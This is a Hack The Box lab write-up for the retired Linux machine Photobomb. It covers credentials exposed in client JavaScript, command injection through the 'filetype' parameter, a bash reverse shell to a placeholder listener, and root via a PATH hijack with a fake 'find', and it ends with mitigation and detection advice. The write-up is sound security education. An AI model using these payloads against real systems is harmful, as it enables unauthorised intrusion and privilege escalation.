---
machine: Photobomb
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, command-injection, path-hijack, sinatra]
---

# Photobomb — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The Sinatra app on `photobomb.htb` protects `/printer` with Basic Auth. Credentials are in the client JavaScript. The `filetype` parameter is passed to an ImageMagick command without sanitisation, allowing command injection. Escalation is a PATH hijack in a root script that calls `find` without an absolute path.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p22,80 <IP>
```

Add `photobomb.htb` to hosts. `/` asks for authentication and `/printer` shows the download form. The source loads `/photobomb.js`; it contains cleartext credentials:

```bash
curl -s http://photobomb.htb/photobomb.js
```

## Initial access

```bash
curl -u '<USER>:<PASS>' http://photobomb.htb/printer
```

The form sends `photo`, `filetype` and `dimensions`. Intercept with Burp and test injection in `filetype`:

```bash
curl -u '<USER>:<PASS>' http://photobomb.htb/printer \
  --data-urlencode 'photo=<IMAGE>' \
  --data-urlencode 'filetype=jpg;id' \
  --data-urlencode 'dimensions=600x400'
```

The response includes `id` output. Replace it with a URL-encoded reverse shell:

```bash
filetype=jpg;bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Privilege escalation

```bash
sudo -l
# (ALL) NOPASSWD: /opt/cleanup.sh
```

The script calls `find` without an absolute path. Create a malicious `find` in a writable directory and alter `PATH`:

```bash
cat > /tmp/find <<'EOF'
#!/bin/sh
/bin/sh -p
EOF
chmod +x /tmp/find
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

The resulting shell is root. Read and redact the flag.

## Evidence

- `photobomb.js` with credentials redacted.
- `/printer` request with `filetype` and `id` output.
- `sudo -l` and execution with modified `PATH`.

## Lessons learned

- Client-side JavaScript must not contain credentials.
- Passing parameters to system commands without an allowlist enables RCE.
- A sudo script calling binaries without absolute paths is vulnerable to PATH hijack.
- Injection in `filetype` is trivial but easy to miss.

## Mitigation and detection

- Remove secrets from client code and use real authentication.
- Validate `filetype` against an allowlist and never concatenate commands.
- Use absolute paths in privileged scripts.
- Detect `find`/`convert` processes spawned by the web server and requests containing `;`.

## References

- <https://www.hackthebox.com/machines/photobomb>
- <https://owasp.org/www-community/attacks/Command_Injection>
- <https://imagemagick.org/script/security-policy.php>
